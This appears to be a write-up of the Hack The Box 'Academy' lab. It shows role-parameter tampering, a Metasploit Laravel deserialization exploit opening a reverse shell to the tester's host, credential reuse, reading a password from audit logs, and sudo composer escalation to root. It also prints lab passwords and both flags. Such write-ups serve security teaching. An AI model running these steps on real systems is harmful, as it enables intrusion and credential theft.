---
title: HTB Academy Writeup
date: 2026-10-08 00:47:00 +0400
categories: [HTB, Easy]
tags: [laravel, rce, php-deserialization, password-reuse, audit-logs, composer-gtfobins]
---

# HTB Academy — Writeup

**Machine**: Academy | **OS**: Ubuntu Linux | **Difficulty**: Easy | **IP**: 10.129.102.248

---

## Machine Information

- **Operating System**: Ubuntu Linux
- **Web Server**: Apache httpd 2.4.41
- **Framework**: Laravel (PHP)
- **Primary Service**: HTB Academy web application
- **Database**: MySQL (port 33060 - MySQL X protocol)
- **SSH**: OpenSSH 8.2p1 Ubuntu 4ubuntu0.1

---

## Reconnaissance & Enumeration

### Full Port Scan

Performed complete port enumeration:

```bash
sudo nmap -p- --reason --min-rate 10000 10.129.102.248
```

**Scan Results:**
```bash
Nmap scan report for 10.129.102.248
Host is up, received reset ttl 63 (0.25s latency)
Not shown: 65532 closed tcp ports (reset)
```
```bash
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63
33060/tcp open mysqlx syn-ack ttl 63
```

### Detailed Service Enumeration

Probed open ports for version information:

```bash
nmap -sC -sV -p22,80,33060 10.129.102.248
```

**Detailed Results:**
```bash
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
33060/tcp open mysqlx MySQL X protocol listener
```

**Key Findings:**
- Hostname redirect to academy.htb
- Apache running on port 80
- MySQL X protocol on port 33060
- OpenSSH for remote access

### DNS Resolution Setup

Added hostname to local DNS:

```bash
echo "10.129.102.248 academy.htb" | sudo tee -a /etc/hosts
```

**Result:**

10.129.102.248 academy.htb


### Web Application Discovery

Enumerated web directories:

```bash
gobuster dir -u http://academy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

**Discovered Paths:**
```bash
/images (Status: 301)
/index.php (Status: 200)
/home.php (Status: 302)
/login.php (Status: 200)
/register.php (Status: 200)
```

---

## Initial Access

### Stage 1: Web Application Analysis

Accessed the web application at http://academy.htb

**Landing Page Screenshot:**

![Landing_Page](/assets/img/htb-dog/lading-page.jpg)

**Landing Page:** HTB Academy with two options:
- Register for new account
- Login with existing credentials

### Stage 2: User Registration & Privilege Escalation

![Burp Registration Request](/assets/img/htb-dog/burp-registration.jpg)

Registered a new account with test credentials:
- Username: ch3
- Password: ch3

**Intercepting Registration Request with Burp Suite:**

**Burp Intercepted Request:**

Enabled Burp proxy and captured the registration POST request.

**Critical Discovery:** The registration request included a `roleid` parameter set to 0 (regular user).
![Burp roleid Parameter](/assets/img/htb-dog/burp-roleid.jpg)

**Exploitation:** Modified the `roleid` parameter from 0 to 1 (administrator) and forwarded the request.

**Result:** Successfully registered as admin user!

### Stage 3: Admin Panel Access

Logged in with the modified account (ch3:ch3)

**Admin Panel Revealed:** Access to administrative functions and configuration.

![Admin Panel - dev-staging-01 Message](/assets/img/htb-dog/admin-panel.jpg)

**Critical Finding:** Displayed message: "Fix issue with dev-staging-01.academy.htb (pending)"

This revealed a development subdomain!

### Stage 4: Subdomain Enumeration

Added the discovered subdomain to /etc/hosts:

```bash
echo "10.129.102.248 dev-staging-01.academy.htb" | sudo tee -a /etc/hosts
```

Accessed: http://dev-staging-01.academy.htb

**Laravel Framework Identification:**

![Laravel Framework Screenshot](/assets/img/htb-dog/laravel-framework.jpg)

**Application Type:** Laravel PHP framework detected

---

## Exploitation: Laravel RCE

### Stage 1: Vulnerability Research

Searched Metasploit for Laravel exploits:

```bash
msfconsole
search laravel
```

**Available Exploits:**
```bash
0 exploit/unix/http/laravel_token_unserialize_exec (2018-08-07)
1 exploit/multi/php/ignition_laravel_debug_rce (2021-01-13)
[Other exploits...]
```

**Selected:** `exploit/unix/http/laravel_token_unserialize_exec`

**Vulnerability:** PHP Laravel Framework token deserialization RCE

### Stage 2: Obtaining APP_KEY

The Laravel APP_KEY is required for exploitation.

**APP_KEY:** dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=

### Stage 3: Metasploit Configuration

Configured the exploit module:

```bash
use exploit/unix/http/laravel_token_unserialize_exec
set APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
set RHOSTS 10.129.102.248
set VHOST dev-staging-01.academy.htb
set LHOST 10.10.14.60
set LPORT 4444
run
```

### Stage 4: Executing Exploit

**Exploit Output:**
```bash
[] Started reverse TCP handler on 10.10.14.60:4444
[] Command shell session 1 opened (10.10.14.60:4444 -> 10.129.102.248:60634)
[] Command shell session 2 opened (10.10.14.60:4444 -> 10.129.102.248:60636)
[] Command shell session 3 opened (10.10.14.60:4444 -> 10.129.102.248:60640)
```

**Multiple reverse shells established!**

### Stage 5: Shell Stabilization

Verified access:

```bash
id
```

**Output:**

uid=33(www-data) gid=33(www-data) groups=33(www-data)


Upgraded to interactive bash:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement & Privilege Escalation

### Stage 1: Enumerating System Users

Listed home directories:

```bash
ls -l /home
```

**Users Found:**
```bash
drwxr-xr-x 2 21y4d 21y4d 4096 Aug 10 2020 21y4d
drwxr-xr-x 2 ch4p ch4p 4096 Aug 10 2020 ch4p
drwxr-xr-x 5 cry0l1t3 cry0l1t3 4096 Oct 7 19:01 cry0l1t3
drwxr-xr-x 3 egre55 egre55 4096 Aug 10 2020 egre55
drwxr-xr-x 2 g0blin g0blin 4096 Aug 10 2020 g0blin
drwxr-xr-x 5 mrb3n mrb3n 4096 Aug 12 2020 mrb3n
```

**Target:** cry0l1t3 (has recent activity - Oct 7)

### Stage 2: Finding Database Credentials

Located Laravel .env file:

```bash
cat /var/www/html/academy/.env
```

**Database Configuration:**
```bash
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```

**Key Finding:** Database password: `mySup3rP4s5w0rd!!`

### Stage 3: Password Reuse Against cry0l1t3

Attempted SSH with database password:

```bash
ssh cry0l1t3@localhost
```

**Password:** mySup3rP4s5w0rd!!

**Result:**
```bash
cry0l1t3@localhost's password: mySup3rP4s5w0rd!!
$ id
uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)
```

**Success!** cry0l1t3 has access, and is member of **adm group**!

### Stage 4: Capturing User Flag

Retrieved the user flag:

```bash
cat user.txt
```

**User Flag:**

f24263488aadf5895d12a47fd4423d44

### Stage 5: Exploiting ADM Group Membership

The `adm` group provides read-only access to system log files in `/var/log`

Used **aureport --tty** to read audit logs and reconstruct terminal activity:

```bash
aureport --tty
```
```bash
**Audit Log Output:**
TTY Report
date time event auid term sess comm data
08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",
08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",
08/12/2020 02:28:24 89 0 ? 1 sh "whoami",
08/12/2020 02:28:28 90 0 ? 1 sh "exit",
08/12/2020 02:28:37 93 0 ? 1 sh "/bin/bash -i",
```
**Critical Discovery:** Found mrb3n's password in audit logs!

mrb3n password: mrb3n_Ac@d3my!


### Stage 6: Lateral Movement to mrb3n

Logged in as mrb3n:

```bash
ssh mrb3n@localhost
```

**Password:** mrb3n_Ac@d3my!

**Confirmation:**

Last login: Tue Feb 9 14:20:36 2021
$ id
uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)

---

## Privilege Escalation to Root

### Stage 1: Sudo Enumeration

Checked sudo permissions:

```bash
sudo -l
```

**Output:**
```bash
Matching Defaults entries for mrb3n on academy:
env_reset, mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User mrb3n may run the following commands on academy:
(ALL) /usr/bin/composer
```

**Critical Finding:** Can run composer as root without password!

### Stage 2: Researching Composer Exploitation

Checked GTFOBINS for composer privilege escalation:

https://gtfobins.org/gtfobins/composer/

**Vulnerability:** Composer can execute arbitrary scripts via the `run-script` command

### Stage 3: Creating Malicious composer.json

Changed to /tmp directory:

```bash
cd /tmp
```

Created a malicious composer.json with script:

```bash
echo '{"scripts":{"x":"id"}}' > composer.json
```

### Stage 4: Testing Command Execution

Executed composer script as root:

```bash
sudo composer run-script x
```

**Output:**

Do not run Composer as root/super user! See https://getcomposer.org/root for details
id
uid=0(root) gid=0(root) groups=0(root)


**Success!** Commands execute as root!

### Stage 5: Reading Root Flag

Modified composer.json to read root flag:

```bash
echo '{"scripts":{"x":"cat /root/root.txt"}}' > composer.json
```

Executed as root:

```bash
sudo composer run-script x
```

**Root Flag:**

733d583a66fdcb32f96616c8e9ab5d69


---

## Summary & Key Takeaways

### Attack Chain

1. **Port Scanning** → Discovered Apache on port 80 and MySQL on port 33060
2. **DNS Setup** → Added academy.htb hostname to /etc/hosts
3. **Web Enumeration** → Found registration and login pages
4. **Privilege Escalation (Registration)** → Modified roleid from 0 to 1 during registration
5. **Admin Access** → Logged in with elevated privileges
6. **Subdomain Discovery** → Found dev-staging-01.academy.htb in admin panel
7. **Framework Identification** → Detected Laravel PHP framework
8. **CVE Research** → Found Laravel deserialization RCE
9. **APP_KEY Discovery** → Located encryption key for exploitation
10. **Metasploit Exploitation** → Used laravel_token_unserialize_exec for RCE
11. **Initial Shell** → Obtained www-data reverse shell
12. **Credential Discovery** → Found database creds in .env file
13. **Password Reuse** → cry0l1t3 used same password as database
14. **ADM Group Exploitation** → Used aureport --tty to read audit logs
15. **Audit Log Extraction** → Found mrb3n's password in TTY logs
16. **Lateral Movement** → Pivoted to mrb3n user
17. **User Flag** → Captured user.txt
18. **Sudo Enumeration** → Discovered composer can run as root
19. **GTFOBINS Exploitation** → Used composer run-script for RCE
20. **Root Access** → Executed arbitrary commands as root
21. **Root Flag** → Captured root.txt

### Key Vulnerabilities

- **Insecure Registration** → roleid parameter modifiable by user
- **Laravel Deserialization** → Token handling vulnerability
- **Database Credential Storage** → Plaintext in .env file
- **Password Reuse** → Database password used for system user
- **Audit Log Access** → adm group can read sensitive TTY logs
- **Sudo Misconfiguration** → composer runnable as root without password
- **Composer Script Execution** → run-script executes arbitrary commands

### Tools Used

- `nmap` — Port scanning and service enumeration
- `gobuster` — Directory enumeration
- Burp Suite — HTTP request interception and modification
- `msfconsole` — Metasploit framework
- `laravel_token_unserialize_exec` — Laravel RCE exploit
- `ssh` — Remote access
- `aureport` — Audit log analysis
- GTFOBINS — Exploit research
- `composer` — PHP dependency manager (exploitation vector)

---

## Flags

- 🚩 **User Flag**: f24263488aadf5895d12a47fd4423d44
- 🚩 **Root Flag**: 733d583a66fdcb32f96616c8e9ab5d69

**Machine: Completed ✓**
